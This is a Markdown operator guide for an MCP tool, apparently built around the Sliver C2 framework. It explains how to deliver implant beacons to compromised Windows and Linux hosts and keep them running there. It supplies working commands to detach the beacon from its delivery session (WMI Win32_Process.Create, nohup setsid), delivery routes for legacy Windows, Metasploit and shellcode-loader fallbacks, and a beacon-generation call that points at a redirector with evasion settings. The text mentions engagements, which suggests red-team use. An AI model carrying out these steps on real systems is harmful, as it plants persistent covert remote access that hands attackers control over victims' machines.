# Beacon delivery & detachment

`sliver-mcp` builds the implant/beacon (`generate_beacon`, `generate_implant`,
`regenerate_or_build`); **delivery** — getting it running on the target so it
survives the delivery channel closing — is the operator's job.

The trap on both platforms is the same: a beacon launched as a child of your
remote-access session is tied to that session's lifetime and is killed when the
session closes, often after only a single check-in. Detach it from the session.

## Windows — WinRM delivery

`Start-Process` inside a WinRM (PowerShell Remoting) session attaches the spawned
process to the **WinRM session's Windows job object**. When the WinRM connection
closes, that job object is torn down and the beacon is killed with it — the
symptom is one check-in, then the beacon goes dark right after you disconnect.

Detach with WMI `Win32_Process.Create`, which spawns a session-0 process fully
decoupled from the WinRM job object:

```powershell
# tied to the WinRM job object, killed on disconnect:
Start-Process C:\Windows\Temp\beacon.exe

# decoupled session-0 process that survives WinRM disconnect:
([wmiclass]"Win32_Process").Create("C:\Windows\Temp\beacon.exe")
```

`Win32_Process.Create` is the canonical Windows-over-WinRM delivery method for a
Sliver beacon built by this MCP. Deliver the file first (`upload`, or stage it
on a share), then create the process via WMI.

## Linux — SSH / mosh delivery

A bare `&` inside an SSH or mosh session does **not** fully detach the beacon: it
stays in the session's process group and still receives `SIGHUP` when the session
closes (the controlling terminal goes away), killing the beacon — the Linux
equivalent of the WinRM job-object teardown above.

Correct detachment needs a new session (`setsid`, which breaks SIGHUP
propagation) plus `nohup` and stdin/stdout/stderr redirected away from the
terminal:

```bash
# still in the session's process group, SIGHUP'd on disconnect:
./beacon &

# new session, no controlling terminal, survives session close:
nohup setsid ./beacon </dev/null >/dev/null 2>&1 &
```

This is the Linux counterpart to the Windows `Win32_Process.Create()` pattern:
both decouple the beacon from the delivery session so it keeps calling back after
you disconnect.

## Legacy Windows Go runtime constraint (Win7 / Server 2008 R2)

Sliver beacons built with **Go 1.21 or later** will not run on Windows 7 or
Windows Server 2008 R2. This is a Go runtime constraint, not a Sliver-specific
bug: Go 1.21 raised the minimum supported Windows version from Windows 7
(Server 2008 R2) to Windows 10 (Server 2019). Sliver 1.7.3 compiles beacons
with Go 1.25.x; the runtime checks the Windows version at startup and aborts
before any network I/O.

### Symptom

The beacon is delivered and the process is created successfully, but it exits
within one second and no callbacks reach the listener. There are no error
messages visible to the operator.

```
$ strings beacon.exe | grep "^go1."
go1.25.6
```

Go 1.21+ confirmed => beacon will abort on Win7 / Server 2008 R2. Any
delivery method (Meterpreter upload, ADODB.Stream, SMB staging) produces the
same result: the binary lands, the process is visible briefly in `tasklist`,
then it vanishes with no network activity.

> **Contrast with the Win2003/XP delivery wall:** Win2003 fails at *delivery*
> (the beacon is too large to land on disk via the available channels). Win7
> and Server 2008 R2 fail at *runtime* (the beacon lands and executes, then
> the Go runtime rejects the OS and exits). The diagnostic is different: size
> error on Win2003, silent exit with no callbacks on Win7/2008R2.

### Affected Sliver versions

All Sliver releases that embed Go 1.21 or later. As of Sliver 1.7.3, the
embedded Go toolchain is Go 1.25.x. Any beacon produced by a standard modern
Sliver server will hit this constraint on pre-Windows-10 targets.

### Recommended approach for Win7 / Server 2008 R2

| Option | Notes |
|---|---|
| Metasploit stageless session | Meterpreter is a C-based payload; no Go runtime version check. Reliable on Win7/2008R2. Use the msf MCP to hold the session. |
| Custom shellcode loader | Any C/C++ loader hosting shellcode avoids the Go runtime. |
| Sliver from source with Go 1.20 | Go 1.20 still supports Win7. Build the Sliver server from source specifying `GOVERSION=1.20`; the resulting beacons will run on Win7/2008R2. Not supported by standard Sliver releases; re-verify on each Sliver update. |

For targets confirmed as Win7 / Server 2008 R2 (or older), skip Sliver C2 and
note the reason in the engagement record. Metasploit is the reliable fallback
for initial access and post-exploitation on these targets.

## Legacy Windows delivery constraint (Win2003 / WinXP)

32-bit targets running Windows Server 2003 SP2 or Windows XP SP3 lack most of
the delivery primitives available on modern Windows. The standard pool beacon
(obfuscated, ~33 MB for Win32) **cannot be delivered** to these targets; each
mechanism hits a hard wall:

| Mechanism | Result |
|---|---|
| `ADODB.Stream` + XMLHTTP | Buffers the full response in memory; `Write to file failed` on large responses (>~20 MB observed on Win2003 SP2). |
| Meterpreter TLV upload | ~33 MB over the Meterpreter channel stalls and times out (10+ min); unusable in practice. |
| PowerShell | Absent on Win2003 SP2. `IEX` / `Invoke-WebRequest` unavailable. |
| `bitsadmin` / BITS | Not available in the IIS worker process security context on Win2003. |

**Practical delivery limit:** ADODB.Stream XMLHTTP works reliably up to roughly
10-20 MB on Win2003 SP2.

### Recommended approach for legacy targets

Generate a stripped-down beacon with obfuscation and evasion disabled so the
output stays within the ~10-20 MB window:

```
generate_beacon(
    c2_host="<redirector>",
    protocol="https",
    os="windows",
    arch="386",
    fmt="exe",
    obfuscate=False,   # skip obfuscation -- saves ~10-15 MB on Win32
    evasion=False,
    name="pool-https-win32-slim",
)
```

If the target has an **SMB share** or **FTP** that the operator can write to
(e.g. via a Meterpreter session), stage the beacon there and execute via
`Win32_Process.Create()`. This bypasses the XMLHTTP memory buffer entirely.

> Note: pool builds (`pool-https-win32`) are normally obfuscated and will exceed
> the delivery limit on Win2003/XP. Keep a separate slim build in the pool when
> working legacy targets, or generate one on demand and remove it after use.
